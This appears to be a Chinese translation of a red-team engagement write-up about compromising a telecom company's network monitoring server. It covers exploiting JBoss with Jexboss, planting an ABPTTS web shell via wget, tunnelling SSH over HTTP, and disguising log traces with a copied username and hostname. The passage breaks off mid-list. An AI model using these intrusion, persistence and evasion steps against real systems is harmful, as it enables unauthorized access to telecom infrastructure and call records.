>
> TLDR；作为一个电信公司的红队，从该公司的网络监控系统（NMS）获得一个立足点。通过基于HTTP协议的SSH隧道解决了Shell反连问题。通过HTTP获得SSH连接时，使用了Ninja。搭建代理以进行内部网络扫描。使用SS7应用程序访问CDR和VLR。
由于信息的敏感性，本文很多信息均已打码。
## 介绍
不久前，我正在为一个客户进行红队渗透测试。甲方爸爸是一家电信公司，要求我进入到内网，控制该电信网络的呼叫数据记录（CDR）。如果您不知道CDR是什么，下面是它的定义（从Wikipedia中无耻地复制而来）：
>
> 呼叫详细记录（CDR）是由电话交换或其它电信设备所产生的数据记录的文档，记录了通过电话呼叫或其它电信传输（例如，文本消息）的细节信息。该记录包含呼叫的各种属性，例如时间，持续时间，完成状态，源号码和目的地号码。
在我所有的渗透测试中，这次经历的重要性可以占有一席之地。获得最初的立足点太容易了（通过一个简单的网络服务漏洞来获得RCE），但是问题在于维持稳定的shell。
## 第一部分：获取RCE
本文章（而不是教程）会分享我从 **远程代码执行（RCE）** 到代理内部网络扫描的经验。
### 侦察
每个道德黑客/渗透测试人员/漏洞赏金猎人/红队成员都知道侦察的重要性。“给我六个小时砍下一棵树，我将用头四个时间削斧头（emmm，就是磨刀不误砍柴工啊）”这话说得太对了。侦察范围越广，就越有利于渗透。
因此，对于RTE而言，有效的信息侦察包括：DNS枚举，ASN和BGP查找，来自多个搜索引擎的一些被动侦察，检查GitHub、BitBucket、GitLab等源代码库（上面很多意外之喜），如果找不到RCE，则对员工进行OSINT信息搜集，以实施鱼叉式网络钓鱼攻击。（所言并非妄语，欺骗员工下载并执行恶意文档其实很容易，当然，前提是您得搞定
**AVs和垃圾邮件过滤器** ）
当对一个特定组织进行网络侦察，有很多种方法。就我而言，我喜欢从DNS枚举开始。
    aiodnsbrute -v -t 7000 — no-verify -w dns-list.uniq.lst ******.com.** | grep -v Timeout | grep -v Misformatted | grep -v exception
> 有趣的事实：我使用的字典有277万条DNS记录。  
>
> 大多数赏金猎人会为找到的所有子域名寻找80或443端口。问题是，有时为了安全起见，最好全端口扫描一次。以我为例，我发现了一个子域名`e[REDACTED]-nms.[REDACTED].com.[REDACTED]`，经过全端口扫描后，发现了一些有趣的结果。
端口12000和14000没啥特别，但是14100就很有意思了，简直捡到宝了！
**J-Fuggin-Boss ！！**
## 远程代码执行
从这里开始，每个利用过臭名昭著的JBoss漏洞的人都知道事情将如何发展。对于新手，如果您没有JBoss开发的经验，则可以查看以下链接来了解这个漏洞：
[JBoss:您进入企业网络的桥梁](https://www.redteam-pentesting.de/publications/2010-04-21-JBoss-Bridging-the-Gap-Between-the-Enterprise-and-You_Ruhr-Universitaet-Bochum_RedTeam-Pentesting.pdf)  
[hacking_and_securing_jboss](https://doc.lagout.org/Others/hacking_and_securing_jboss.pdf)
对于Jboss渗透，可以使用[Jexboss](https://github.com/joaomatosf/jexboss)。该工具包含许多方法和渗透技术，还涵盖了Application和Servlet反序列化和Struct2漏洞利用。您也可以使用Metasploit来渗透JBoss。说一千道一万，我还是更喜欢使用Jexboss。
继续渗透，jexboss命令如下：
    ./jexboss.py -u http://[REDACTED]:14100/
从上面的屏幕截图可以看出，该服务器存在漏洞。然后，使用JMXInvokerServlet方法，可以在服务器上执行远程代码。是不是觉得相当无脑？
**所以观众朋友们一定以为我在水文了**
往下看就行！
现在既然有了立足点，实际的问题出现了。当然，像往常一样，一旦有了RCE，我就尝试建立反向shell。
结果还真的反连成功了！
但是，shell很不稳定，几秒钟后python进程就被杀死了。我尝试了使用其他的一句话反连payload，试了不同的通用端口，甚至试了UDP，但都无功而返。我还尝试了不同形式的`reverse_tcp/http/https`
Metasploit payload来获得Meterpreter连接，但无一例外都在几秒钟后断开了连接。
我以前曾经遇到过类似的情况，并且我总是问如果我无法获得反向shell连接，该怎么办？
## 通过HTTP隧道输入绑定shell连接！
现在，当我尝试获得稳定的反连shell时，我失败了。我想到的另一个想法是获取一个监听类型的shell（bind
shell，出于稳定性通过HTTP协议获得SSH隧道），而不是基于HTTP 的反连 shell（HTTP上的TCP隧道）。
> **HTTP上的TCP隧道（用于实现TCP稳定)+ SSH隐形连接（通过创建的TCP隧道）+
> 内网使用Metasploit的SOCKS隧道（动态SSH隧道）=通过这些递归隧道渗透内网来获取数据。**
看起来很复杂？让我们将其分为多个步骤：
    1. 首先，我在服务器和NMS服务器之间创建了一个网桥，它支持除HTTP/HTTPS以外的其他协议的通信（目前暂不提供L2）[ HTTP上的TCP隧道 ]
    2. 创建网桥（HTTP上的TCP隧道）后，建立从我的服务器（2222/tcp）到NMS服务器（22/tcp）的SSH端口转发，以便可以基于HTTP通过SSH连接到NMS服务器。（准确地说，是通过HTTP协议上的TCP连接中的SSH）注意：NMS服务器上的SSH服务运行在127.0.0.1上
    3. 然后，将NMS SSH服务器配置为允许root登录并生成SSH私钥（将我的公钥复制到`authorized_hosts`文件），以便通过SSH访问NMS服务器。
    4. 我使用私钥检查了与NMS服务器的SSH连接，连接建立后，创建了一个动态SSH隧道（SOCKS），以便通过SSH隧道代理Metasploit（准确地说，是通过HTTP协议上的TCP连接中的SSH隧道来代理Metasploit）（十分之拗口，我崩溃了……）。
我会逐步介绍如何创建隧道以及如何使用它们。
### 隧道101
>
> 隧道协议是一个通信协议，允许数据从一个网络传输到另一个网络。允许通过封装跨专用网络（例如Internet）发送专用网络通信。因为隧道化涉及将流量数据重新打包为另一种形式（也许以加密为标准），所以它可以隐藏其本身通过隧道传输流量的性质。
>
> 隧道协议通过使用数据包的数据部分（payload）来承载实际提供服务的数据包。隧道使用分层协议模型（例如OSI或TCP /
> IP协议的分层协议模型）。但是，使用payload来承载网络通常不提供的服务时，通常会违反分层协议。通常，传输协议在分层模型中的操作级别与payload协议的相同或比它更高。  
>  资料来源：维基百科
因此，基本的想法是使用Web服务器作为中间代理，将所有网络数据包（TCP数据包）从Web服务器转发到内网。
使用HTTP协议通过Web服务器将TCP数据包转发到内部网络
TCP隧道可以在端口访问受限和出口流量过滤的情况下能给我们提供很多便利。本次渗透倒没有被过滤流量，但是我使用了这种技术主要用来获得稳定的shell连接。
现在，我已经在服务器上具有RCE，并且具有root权限，于是使用ABPTTS创建了一个基于JSP的shell。
### 通往内网的康庄大道：ABPTTS
如GitHub中所述：
> ABPTTS使用Python客户端脚本和Web应用程序服务器页面/程序包，通过HTTP /
> HTTPS连接到Web应用程序服务器，从而建立TCP流量隧道。
当前，此工具仅支持`JSP/WAR`和`ASP.NET`服务器端组件。
因此，基本思路是使用`ABPTTS`创建基于JSP的shell并将其上传到Web服务器，让该工具与JSP
Shell连接，并通过HTTP创建TCP隧道，从而在本地与服务器之间创建一个安全的连接（SSH） 。
    python abpttsfactory.py -o jexws4.jsp
当使用ABPTTS生成shell时，该工具将创建一个配置文件，用来通过HTTP/HTTPS创建TCP隧道。
然后，我使用wget将JSP Shell上传到服务器。 **注意：jexws4.war
shell是Jexboss的软件包。当您通过Jexboss利用JBoss漏洞时，该工具会将自己的WAR
shell上传到服务器。就我而言，我只是试图找到此WAR/JSP shell（jexws4.jsp）并将其替换为ABPTTS shell。**
    wget http://[MY SERVER]/jexws4.jsp -O 
将ABPTTS shell上传到服务器后，在Jexboss上执行随机命令来查看结果输出。现在，Jexboss shell已被ABPTTS
shell覆盖，无论我执行了什么命令，由于ABPTTS shell的原因，输出始终是哈希值，如下图所示。
从上图可以看到，当我执行`id`命令时，我得到了一个奇怪的哈希值，证明ABPTTS shell成功上传！
现在，我已经在HTTP上配置了TCP隧道，接下来我要做的是在NMS服务器22端口建立SSH隧道，并将端口绑定到我的系统（对应2222端口）。这样我就可以通过SSH连接到NMS。
通过HTTP上的TCP隧道进行SSH端口转发（尚未建立隧道）
下一步准备端口转发，以便可以使用本地2222端口访问NMS服务器上的22端口。
    python abpttsclient.py -c  -u  -f 127.0.0.1:2222/127.0.0.1:22
如下图所示，本地服务器的2222端口处于LISTEN状态。
下一件事是配置SSH服务器以连接到NMS并启动动态SSH隧道（SOCKS），以进一步利用网络。
### SSH隐蔽访问
连接到SSH服务器后，连接信息将保存在一个日志文件中。要查看这些连接的详细信息，可以在Unix系统中执行`w`命令。
>
> 在许多类似Unix的操作系统中，命令`w`提供了每个登录到计算机的用户的快速摘要、每个用户当前正在执行的操作以及所有活动对计算机本身造成的负担。该命令是Unix程序中其他几个单命令的组合：`who`，`uptime`和`ps
> -a`。资料来源：维基百科
因此，从根本上来说，源IP信息被该系统保存了，这对于红队队员来说是危险的。由于这是RTE，因此我一定不能让管理员知道我的C2位置。（不用担心，我使用的ABPTTS
shell是从服务器连接的，并且我已经购买了一个域名用来实施IDN Homograph攻击，以减少踪迹泄露的机会）
为了使隐蔽连接正常工作，我查看了hosts文件以收集更多信息，发现该服务器在网络内部的使用率很高。
这样的服务器已经受到监视，因此我的动静必须尽可能小。NMS服务器监视的应该是与该服务器之间的所有网络连接。这意味着我无法通过HTTP的TCP隧道使用普通端口进行扫描。
**那如果使用SSH将我的服务器和NMS服务器之间的通信进行加密呢？**
但是对于SSH连接，我的主机名和IP信息将被存储在日志文件中，并且用户名也容易暴漏。
我的服务器用户名为“ harry”，如果为此用户生成一个密钥并将其存储在authorized_keys文件中的话，并不是一个好的选择。
然后，想到了一个主意：
    1. 在我的服务器上创建用户“ nms”（该用户已在NMS服务器中创建）。
        2. 将我的服务器的主机名从OPENVPN 更改为[REDACTED]_NMS[REDACTED]。（与NMS服务器相同）